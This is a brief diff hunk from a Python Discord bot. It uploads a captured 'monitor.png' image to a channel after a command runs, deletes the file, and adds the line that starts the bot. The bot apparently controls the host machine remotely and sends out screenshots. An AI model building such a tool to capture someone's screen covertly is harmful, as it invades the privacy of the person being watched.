@@ -124,3 +124,5 @@ async def on_message(message):
             file = discord.File((path), filename="monitor.png")
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.remove(path)
+            
+client.run(token)
